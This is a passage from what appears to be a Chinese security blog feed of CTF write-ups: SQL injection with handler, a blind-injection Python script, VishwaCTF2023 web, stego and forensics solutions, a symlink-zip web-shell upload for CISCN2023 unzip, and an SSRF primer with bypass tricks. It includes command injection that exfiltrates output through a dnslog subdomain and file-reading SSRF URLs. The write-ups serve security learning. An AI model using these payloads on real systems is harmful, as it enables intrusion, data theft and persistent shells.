mysql">?inject=&#x27;;show+columns+from+FlagHere;%23<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/30/HWsPklyxOIbhXur.png" alt="image-20221230190325044" style="zoom:25%;" /><p>发现flag在表 FlagHere 的flag字段下。</p><p>但是select都被过滤了。我们可以使用不用select查询数据的方法，预编译prepare，handler等。</p><p>但是 prepare被过滤了。我们只能使用 mysql中 <code>handler</code>了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?inject=&#x27;;handler+FlagHere+open;handler+FlagHere+read+first;handler+FlagHere+close;%23<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/30/dtnxViy7ZbEg3vJ.png" alt="image-20221230185955397" style="zoom:33%;" /><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blind_injection</span>(<span class="hljs-params">url</span>):<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    strings = <span class="hljs-string">&quot;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strings:<br>            payload = <span class="hljs-string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="hljs-built_in">format</span>(num, <span class="hljs-built_in">ord</span>(i))<br>            post_data = &#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;<br>            res = requests.post(url=url, data=post_data)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>                flag += i<br>                <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&#x27;http://cefdf5c8-74b2-40e1-a7c2-3a5b4e5f93d6.node4.buuoj.cn:81/index.php&#x27;</span><br>    blind_injection(url)<br></code></pre></td></tr></table></figure><p>使用 bool盲注，注意 sleep,否则访问太快，状态码为429.</p><p>此处我们要将 分割出来的字符，使用 ascii() 函数转换为ascii码(不转的话，此处会检测到sql注入)</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web(第1页wp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VishwaCTF2023</title>
    <link href="/2023/08/24/VishwaCTF2023/"/>
    <url>/2023/08/24/VishwaCTF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="【VishwaCTF2023】wp"><a href="#【VishwaCTF2023】wp" class="headerlink" title="【VishwaCTF2023】wp"></a>【VishwaCTF2023】wp</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>目录扫描，扫描到了<code>robots.txt</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041515755.png" alt="image-20230404151550711" style="zoom: 50%;" /><p>我们访问<code>/robots.txt</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;btn&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b&gt;System Details: &lt;/b&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;uname -a&quot;</span>); <br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p> <code>uname</code>（英文全拼：unix name）命令用于显示操作系统信息，例如内核版本、主机名、处理器类型等。。</p><p>uname 可显示电脑以及操作系统的相关信息。-a表示所有</p></blockquote><p>很明显，这是命令执行，我们直接传参即可：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041519245.png" alt="image-20230404151920194" style="zoom:33%;" /><p>发现flag藏在环境变量中</p><h4 id="Mascot"><a href="#Mascot" class="headerlink" title="Mascot"></a>Mascot</h4><p>扫描一下目录，发现git泄露：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041522644.png" alt="image-20230404152202468"></p><p>但是我们使用<code>GitHack</code>下载不下来，但是里面有一个 <code>FLAGGGGG.md</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041526557.png" alt="image-20230404152658487" style="zoom:50%;" /><p>下载得到flag</p><h4 id="Eeezzy"><a href="#Eeezzy" class="headerlink" title="Eeezzy"></a>Eeezzy</h4><blockquote><p>I forgot my login details again!</p></blockquote><p>view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>]=<span class="hljs-literal">null</span>;<br><br>    <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$flag</span>)==<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$flag</span>)==<span class="hljs-number">0</span>)<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>]=<span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>]=<span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$th</span>) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>]=<span class="hljs-variable">$flag</span>;<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>strcmp()</code>函数可以使用数组绕过，</p><blockquote><p><strong>strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。</strong></p></blockquote><p>这里我们只能让password为数组：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041545169.png" alt="image-20230404154539089"></p><h4 id="aLive"><a href="#aLive" class="headerlink" title="aLive"></a>aLive</h4><blockquote><p>In my college level project I created this website that tells us if any domain&#x2F;ip is active or not. But there is a catch.</p></blockquote><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041619439.png" alt="image-20230404161910385" style="zoom: 33%;" /><p>打开发现一个可以检测站点的输入框，检测只会提示是否active，并没有回显</p><p>看了wp，我知道了需要使用<code>DNSlog平台</code>，之前了解过，但是没有使用过<a href="http://dnslog.cn/">DNSlog</a></p><blockquote><p>什么是DNSlog?</p><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以通过这种方式把想获得的数据外带出来。</p><p>DNS 的全称是 Domain Name System（网络名称系统），它作为将域名和 IP 地址相互映射，使人更方便地访问互联网。当用户输入某一网址如 <a href="http://www.baidu.com,网络上的/">www.baidu.com，网络上的</a> DNS Server 会将该域名解析，并找到对应的真实 IP 如 127.0.0.1，使用户可以访问这台服务器上相应的服务。</p><p>了解到了什么是 DNS，那么什么又是 DNSlog 呢？</p><p>DNSlog 就是存储在 DNS Server 上的域名信息，它记录着用户对域名 <a href="http://www.baidu.com/">www.baidu.com</a> 等的访问信息，类似日志文件</p></blockquote><p>我们使用DNSlog平台，生成一个DNS服务器：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041623501.png" alt="image-20230404162337417"></p><p>然后我们使用输入框输入该域名，记得加上三级域名：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">123</span><span class="hljs-selector-class">.r736ym</span><span class="hljs-selector-class">.dnslog</span>.cn<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041626772.png" alt="image-20230404162601657" style="zoom: 25%;" /><p>成功外带，回显数据。</p><p>测试了一下，发现是RCE，于是我们如下构造：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`whoami`.r736ym.dnslog.cn<br></code></pre></td></tr></table></figure><p>成功命令执行，说明是root用户</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041628538.png" alt="image-20230404162819440" style="zoom:33%;" /><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`sort f*`.r736ym.dnslog.cn<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041629984.png" alt="image-20230404162930890" style="zoom: 25%;" /><p>获得flag</p><h4 id="spooky"><a href="#spooky" class="headerlink" title="spooky"></a>spooky</h4><blockquote><p>I forgot my login credentials again!!</p></blockquote><p>一个登录界面，sql注入无果，使用<code>dirsearch</code>扫描：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041841368.png" alt="image-20230404184137206" style="zoom:33%;" /><p>访问<code>/sitemap.xml</code>：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041842940.png" alt="image-20230404184245867"></p><p>发现存放用户名和密码的文件，我们使用bp爆破一下：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041843484.png" alt="image-20230404184326412" style="zoom:33%;" /><p>注意攻击模式要选择这种（能够计算笛卡尔积）保证所有情况</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041844246.png" alt="image-20230404184414191"></p><p>使用账号密码登录</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041846712.png" alt="image-20230404184600637" style="zoom:33%;" /><p>提示权限为user，可能需要改为admin</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041846769.png" alt="image-20230404184640710"></p><p>加上 <code>&amp;admin=true</code></p><h3 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h3><h4 id="Can-you-see-me"><a href="#Can-you-see-me" class="headerlink" title="Can you see me?"></a>Can you see me?</h4><blockquote><p>A magician made the seven wonders disappear. But people claim they can still feel their presence in the air.</p></blockquote><p>将图片使用foremost分离，得到一个压缩包，里面有一个wav文件，我们使用<code>Audacity</code>打开：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041806682.png" alt="image-20230404180624552"></p><p>选择频谱图，得到flag</p><h4 id="Guatemala"><a href="#Guatemala" class="headerlink" title="Guatemala"></a>Guatemala</h4><p>使用010打开文件，发现是GIF图片</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041811545.png" alt="image-20230404181143781"></p><p>发现一串base64编码：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041815453.png" alt="image-20230404181545407"></p><p>或者使用<code>exiftool</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041819013.png" alt="image-20230404181922920" style="zoom:33%;" /><p>解码得到flag：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041816359.png" alt="image-20230404181643275" style="zoom: 33%;" /><h4 id="I-LOVE-YOU"><a href="#I-LOVE-YOU" class="headerlink" title="I LOVE YOU"></a>I LOVE YOU</h4><blockquote><p>There is an audio file given below… It is not so difficult but you will find it’s sound very deep</p></blockquote><p>根据提示，我们使用 <code>DeepSound</code> 去分离隐写在wav中的文件：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041932379.png" alt="image-20230404193252238" style="zoom:33%;" /><p>得到<code>welcome.exe</code>，看图标，很想使用python打包的exe文件，</p><p>我们使用工具<code>pyinstxtractor</code>进行反汇编：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041934630.png" alt="image-20230404193422962" style="zoom: 33%;" /><p>然后使用pyc<a href="https://tool.lu/pyc/">反编译网站进行反编译</a>，得到flag</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304041935678.png" alt="image-20230404193515571"></p><h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="The-Sender-Conundrum"><a href="#The-Sender-Conundrum" class="headerlink" title="The Sender Conundrum"></a>The Sender Conundrum</h4><blockquote><p>Marcus Got a Mysterious mail promising a flag if he could crack the password to the file.</p></blockquote><p>打开电子邮件，叫我们猜一个人名</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Hello Marcus Cooper,<br>You are <span class="hljs-literal">one</span> step behind <span class="hljs-built_in">from</span> finding your flag. <br>Here is <span class="hljs-keyword">a</span> Riddle: <br>I am <span class="hljs-keyword">a</span> noun <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> verb <span class="hljs-keyword">or</span> <span class="hljs-keyword">an</span> adverb.<br>I am given <span class="hljs-built_in">to</span> you <span class="hljs-keyword">at</span> birth <span class="hljs-keyword">and</span> never taken away,<br>You keep me <span class="hljs-keyword">until</span> you die, come what may.<br>What am I?<br></code></pre></td></tr></table></figure><p>我们使用字典进行爆破，但是都没有，最后使用了kali自带的词典：<code>rockyou.txt</code>，爆到了</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304042151462.png" alt="image-20230404215130384" style="zoom: 33%;" /><p>解压得flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VishwaCTF2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unzip</title>
    <link href="/2023/08/24/unzip/"/>
    <url>/2023/08/24/unzip/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2023-unzip"><a href="#CISCN2023-unzip" class="headerlink" title="[CISCN2023]unzip"></a>[CISCN2023]unzip</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>1.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;1.php&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后在命令行输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php -S <span class="hljs-number">192.168</span>.<span class="hljs-number">56.129</span>:<span class="hljs-number">8000</span> -t /<span class="hljs-keyword">var</span>/www/html/<br></code></pre></td></tr></table></figure><p>将 <code>/var/www/html/</code> 作为网站根目录启动php服务器</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305282131856.png" alt="image-20230528212644551"></p><p>搭建成功</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>首先通过1.html上传文件经过1.php，然后我们分析一下1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>...<br><span class="hljs-comment"># 这行代码使用 PHP 内置函数 finfo_open() 创建一个文件信息对象，用于获取指定文件的 MIME 类型</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE); <br><span class="hljs-comment">#这行代码判断上传的文件是否为zip压缩包</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-comment">#如果是zip，就将其解压到/tmp目录</span><br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>看到这里没什么思路，查阅文章  <a href="https://xz.aliyun.com/t/2589">一个有趣的任意文件读取</a> 可知，需要使用linux中的<code>软链接ln</code></p><p><img src="https://s2.loli.net/2023/05/28/tLbqsHcofk31PdN.png" alt="image-20230528213908070"></p><p>软连接的作用类似于win下的快捷方式</p><p>假如我们使用软链接生成<code>web </code>文件让其指向 <code>/var/html/www/</code> 目录的话，我们就可以通过该文件直接访问网站的目录了，然后我们将<code>web</code>文件打包成<code>zip.zip</code>，上传上去，这样就会在 <code>/tmp</code>目录生成一个 <code>web</code>文件，其指向 <code>/var/html/www</code> 目录</p><p>然后我们再上传一个 <code>z.zip</code> 文件 其目录为 : <code>/web/shell.php</code></p><p><img src="https://s2.loli.net/2023/05/28/I1Pj2nZaeifvsxL.png" alt="image-20230528214714531"></p><p>shell.php为一句话木马</p><p>当我们上传<code>z.zip</code>的时候，将其解压到 <code>/tmp</code> 目录下的 <code>web</code>目录下</p><p>重点来了，由于之前我们上传了一个软链接<code>web</code>到<code>/tmp</code> 目录下，此时若解压<code>z.zip</code>的话</p><p>正常情况下会解压到：<code>/tmp/web/shell.php</code> 但是由于<code>web</code>指向了 <code>/var/www/html</code>目录</p><p>所以会恰好将shell.php解压到 <code>/var/www/html/shell.php</code> 刚好解压到网站的访问目录，此时我们可以直接使用蚁剑连接了</p><h3 id="实践探究"><a href="#实践探究" class="headerlink" title="实践探究"></a>实践探究</h3><p>首先使用命令创建软链接：web</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span> web<br></code></pre></td></tr></table></figure><p>然后使用zip命令将其压缩为：zip.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">zip</span> -y <span class="hljs-built_in">zip</span>.<span class="hljs-built_in">zip</span> web<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/28/gQbTIxvNU9ZoHWd.png" alt="image-20230528215547491"></p><p>然后我们上传<code>zip.zip</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305282159645.png" alt="image-20230528215907954"></p><p>成功上传到<code>/tmp</code>目录</p><p>接着将 <code>/web/shell.php</code>压缩：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305282207048.png" alt="image-20230528220716007"></p><p>上传，发现shell.php成功上传到 <code>/var/html/www</code>：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305282211183.png" alt="image-20230528221100149"></p><p>上传成功，然后就可以getshell了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unzip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="/2023/08/24/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/SSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRF-漏洞"><a href="#SSRF-漏洞" class="headerlink" title="SSRF 漏洞"></a>SSRF 漏洞</h2><h3 id="SSRF漏洞介绍："><a href="#SSRF漏洞介绍：" class="headerlink" title="SSRF漏洞介绍："></a>SSRF漏洞介绍：</h3><blockquote><p>　　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的<strong>目标是从外网无法访问的内部系统</strong>。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p></blockquote><h3 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h3><blockquote><p>　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且<strong>没有对目标地址做过滤与限制</strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p></blockquote><h3 id="SSRF漏洞利用手段："><a href="#SSRF漏洞利用手段：" class="headerlink" title="SSRF漏洞利用手段："></a>SSRF漏洞利用手段：</h3><blockquote><p>　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；</p><p>　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</p><p>　　4.攻击内网或外网有漏洞的Web应用；</p><p>　　5.使用  <strong>file:&#x2F;&#x2F;&#x2F; 协议</strong> 读取本地文件(或其他协议）</p><p>　　<a href="http://www.xingkonglangzi.com/ssrf.php?url=192.168.1.10:3306">http://www.xingkonglangzi.com/ssrf.php?url=192.168.1.10:3306</a></p><p>　　<a href="http://www.xingkonglangzi.com/ssrf.php?url=file:///c:/windows/win.ini">http://www.xingkonglangzi.com/ssrf.php?url=file:///c:/windows/win.ini</a></p></blockquote><h3 id="SSRF漏洞出现点："><a href="#SSRF漏洞出现点：" class="headerlink" title="SSRF漏洞出现点："></a>SSRF漏洞出现点：</h3><blockquote><p>　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　</p><p>　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</p><p>　　3.在线翻译</p><p>　　4.图片加载与下载：通过URL地址加载或下载图片</p><p>　　5.图片、文章收藏功能</p><p>　　6.未公开的api实现及调用URL的功能</p><p>　　7.从URL关键字中寻找</p></blockquote><p><img src="https://s2.loli.net/2022/12/18/jPEoXbOzfAYx8cv.png" alt="img"></p><h3 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h3><blockquote><p>　　1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p><p>　　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>　　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a>    推荐：<a href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p><p>　　4.可以指向任意ip的域名　 xip.io               原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1</p><p>　　5.ip地址转换成进制来访问 192.168.0.1&#x3D;3232235521（十进制） </p><p>　　6.非HTTP协议</p><p>　　7.DNS Rebinding</p><p>　　8.利用[::]绕过         